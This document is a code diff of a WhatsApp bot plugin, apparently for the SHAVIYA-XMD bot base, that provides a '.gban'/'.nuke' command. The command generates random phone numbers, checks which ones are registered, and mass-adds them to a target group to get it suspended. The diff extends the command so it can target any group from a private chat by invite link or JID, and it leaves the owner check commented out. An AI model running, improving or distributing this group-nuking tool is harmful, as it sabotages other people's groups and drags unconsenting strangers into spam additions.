@@ -2,19 +2,10 @@
 // 📦 ADVANCED GROUP BAN PLUGIN (For SHAVIYA-XMD Bot Base)
 // ================================================================
 
-const config = require('../config');
-const { cmd, commands } = require('../command');
-const { runtime } = require('../lib/functions');
-const axios = require('axios');
-const os = require("os");
-const fs = require('fs');
-const path = require('path');
-const { exec } = require('child_process');
-const { promisify } = require('util');
-const execAsync = promisify(exec);
+const { cmd } = require('../command');
 
 // ================================================================
-// 1. CONFIGURATION (ඔබට අවශ්‍ය පරිදි වෙනස් කරගන්න)
+// 1. CONFIGURATION
 // ================================================================
 
 const CONFIG = {
@@ -31,46 +22,34 @@ const CONFIG = {
 // 2. UTILITY FUNCTIONS
 // ================================================================
 
-// ප්‍රමාදයක් හදන්න (Delay function)
 const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-// Random WhatsApp Numbers Generate කරන්න
 function generateRandomNumbers(count) {
   const numbers = new Set();
-  
   while (numbers.size < count) {
-    // ඉලක්කම් 9ක් random generate කරන්න
     const randomDigits = Math.floor(Math.random() * 1000000000)
                              .toString()
                              .padStart(9, '0');
-    
-    // Country code එක එකතු කරන්න
     const fullNumber = CONFIG.COUNTRY_CODE + randomDigits;
-    
-    // WhatsApp number format එකට හරිද කියලා check කරන්න
     if (fullNumber.length >= 10 && fullNumber.length <= 15) {
       numbers.add(fullNumber);
     }
   }
-  
   return Array.from(numbers);
 }
 
 // ================================================================
-// 3. REGISTER CHECK FUNCTION (WhatsApp Registered වෙලාද කියලා බලන්න)
+// 3. REGISTER CHECK FUNCTION
 // ================================================================
 
 async function getRegisteredJids(sock, numbers) {
   const registeredJids = [];
-  
   console.log(`🔍 Checking ${numbers.length} numbers for WhatsApp registration...`);
   
   for (let i = 0; i < numbers.length; i += CONFIG.BATCH_SIZE_CHECK) {
     const batch = numbers.slice(i, i + CONFIG.BATCH_SIZE_CHECK);
-    
     try {
       const result = await sock.onWhatsApp(batch);
-      
       if (result && Array.isArray(result)) {
         for (const item of result) {
           if (item.exists && item.jid) {
@@ -78,22 +57,18 @@ async function getRegisteredJids(sock, numbers) {
           }
         }
       }
-      
       console.log(`✅ Checked batch: Found ${registeredJids.length} registered so far.`);
-      
     } catch (error) {
       console.error('Registration check error:', error);
     }
-    
     await delay(CONFIG.DELAY_BETWEEN_CHECKS);
   }
-  
   console.log(`✅ Total registered numbers found: ${registeredJids.length}`);
   return registeredJids;
 }
 
 // ================================================================
-// 4. BOT AUTO-JOIN FUNCTION (Bot එක Group එකට Join වෙන්න)
+// 4. BOT AUTO-JOIN FUNCTION
 // ================================================================
 
 async function autoJoinGroup(sock, inviteCode) {
@@ -101,7 +76,6 @@ async function autoJoinGroup(sock, inviteCode) {
     console.log('ℹ️ No invite code provided. Skipping auto-join.');
     return false;
   }
-  
   try {
     console.log(`🔗 Attempting to join group with invite: ${inviteCode}`);
     await sock.groupAcceptInvite(inviteCode);
@@ -140,9 +114,7 @@ async function groupBan(sock, target, inviteCode = null) {
   // Step 3: Bot එක Admin නැතිනම්, Auto-Join උත්සහ කරන්න
   if (!botIsAdmin) {
     console.log('⚠️ Bot is not admin. Attempting to auto-join via invite...');
-    
     const codeToUse = inviteCode || CONFIG.BOT_INVITE_CODE;
-    
     if (codeToUse) {
       const joined = await autoJoinGroup(sock, codeToUse);
       if (joined) {
@@ -176,11 +148,9 @@ async function groupBan(sock, target, inviteCode = null) {
 
   // Step 7: ULTRA FAST BATCH ADD (එක පාරට 150)
   try {
-    // 🚀 150ම එක පාරට Add කරන්න (Ultra Fast)
     await sock.groupParticipantsUpdate(target, toAdd, "add");
     console.log(`✅ Successfully added ${toAdd.length} members in ONE BATCH!`);
     
-    // තව 150ක් add කරන්න තියෙනවද?
     if (registeredJids.length > targetCount) {
       const secondBatch = registeredJids.slice(targetCount, targetCount + CONFIG.ADD_BATCH_SIZE);
       if (secondBatch.length > 0) {
@@ -191,7 +161,6 @@ async function groupBan(sock, target, inviteCode = null) {
       }
     }
     
-    // Step 8: Group එක හිස් කරලා බෝට් එක Leave වෙන්න
     console.log('💣 Leaving group to finalize nuke...');
     await delay(500);
     await sock.sendMessage(target, { text: "💥 This group is being nuked! Goodbye." });
@@ -209,7 +178,7 @@ async function groupBan(sock, target, inviteCode = null) {
 }
 
 // ================================================================
-// 6. COMMAND HANDLER (.gban)
+// 6. COMMAND HANDLER (.gban) – CORRECTED SIGNATURE
 // ================================================================
 
 cmd({
@@ -220,57 +189,79 @@ cmd({
     category: "admin",
     filename: __filename
 },
-async (robin, mek, m, {
-    from, pushname, quoted, reply, sender
-}) => {
+async (conn, mek, m, { from, reply, args, isOwner }) => {   // <-- Correct signature
+    let targetGroup = null;
+    let inviteCode = null;
+
     try {
-        // Group එකක්ද කියලා බලන්න
-        if (!from.endsWith("@g.us")) {
-            await reply("❌ This command only works in groups.");
-            return;
+        // Optional owner-only check (uncomment if you want)
+        // if (!isOwner) return reply("❌ This command is for the bot owner only.");
+
+        // Case 1: Command used in a group
+        if (from.endsWith("@g.us")) {
+            targetGroup = from;
+            // If user provided an invite code as argument, use it for auto-join if needed
+            inviteCode = args[0] || null;
+        } 
+        // Case 2: Command used in private chat – need to provide group link or JID
+        else {
+            if (!args[0]) {
+                return reply("❌ *Usage in private chat:*\n\nProvide a group invite link or group JID.\n\nExamples:\n`.gban https://chat.whatsapp.com/XXXXX`\n`.gban 120363xxxxx@g.us`");
+            }
+            const input = args[0];
+            // Check if it's an invite link
+            if (input.includes("chat.whatsapp.com/")) {
+                const code = input.split("chat.whatsapp.com/")[1]?.split("/")[0]?.split("?")[0];
+                if (!code) return reply("❌ Invalid invite link.");
+                inviteCode = code;
+                // Try to get group info to get JID
+                try {
+                    const groupInfo = await conn.groupGetInviteInfo(inviteCode);
+                    if (groupInfo && groupInfo.id) {
+                        targetGroup = groupInfo.id;
+                    } else {
+                        return reply("❌ Could not fetch group info from invite.");
+                    }
+                } catch (e) {
+                    return reply(`❌ Invalid invite or bot cannot join: ${e.message}`);
+                }
+            } else if (input.endsWith("@g.us")) {
+                // Direct group JID provided
+                targetGroup = input;
+            } else {
+                return reply("❌ Invalid input. Please provide a group invite link or group JID.");
+            }
         }
 
-        // Command arguments (Invite Code) extract කරන්න
-        // උදා: .gban abc123xyz
-        const args = mek?.message?.conversation?.split(/\s+/) || 
-                     mek?.message?.extendedTextMessage?.text?.split(/\s+/) || [];
-        const inviteCode = args.length > 1 ? args[1] : null;
+        // If still no targetGroup, error
+        if (!targetGroup) return reply("❌ Could not determine target group.");
 
-        // Group එකට Process එක පටන් ගන්නවා කියලා පණිවිඩයක් යවන්න
-        await robin.sendMessage(from, {
-            text: `🚀 Starting Group Nuke...\n📱 Generating random numbers...\n✅ Will add only REGISTERED WhatsApp numbers!\n⏳ Please wait...`,
-            contextInfo: {
-                mentionedJid: [sender],
-            }
-        });
+        // Send initial message
+        await reply(`🚀 Starting Group Nuke...\n📱 Generating random numbers...\n✅ Will add only REGISTERED WhatsApp numbers!\n⏳ Please wait...`);
 
-        // Main Function Run කරන්න
-        await groupBan(robin, from, inviteCode);
-        
-        // මෙතනට එන්නේ නැහැ (Group එක Suspend/Leave වෙලා ඉවරයි)
+        // Execute the ban
+        await groupBan(conn, targetGroup, inviteCode);
+        // Note: groupBan will leave the group, so we might not reach this point.
+        // But if we do (e.g., error prevented leaving), we can send a message.
+        await reply("✅ Group nuke completed (bot may have left).");
         
     } catch (error) {
         console.error("Group Ban Error:", error);
-        
-        // Group එක තවම තියෙනවා නම් Error Message එකක් යවන්න
+        // Try to send error message if group still exists
         try {
-            await robin.sendMessage(from, {
-                text: `❌ Failed: ${error.message || "Unknown error"}`,
-                contextInfo: {
-                    mentionedJid: [sender],
-                }
-            });
+            await reply(`❌ Failed: ${error.message || "Unknown error"}`);
         } catch (e) {
-            console.log("Group probably suspended, can't send error message.");
+            console.log("Could not send error message (group likely suspended).");
         }
     }
 });
 
 // ================================================================
-// 7. HELP MESSAGE (විකල්ප)
+// 7. LOADED MESSAGE
 // ================================================================
 
 console.log('✅ Group Ban Plugin Loaded!');
 console.log('📌 Command: .gban');
 console.log('📌 Alias: .nuke, .destroygroup, .suspend');
-console.log('📌 Usage: .gban [invite_code] (optional)');
+console.log('📌 Usage (in group): .gban [invite_code_optional]');
+console.log('📌 Usage (private): .gban <invite_link_or_group_JID>');
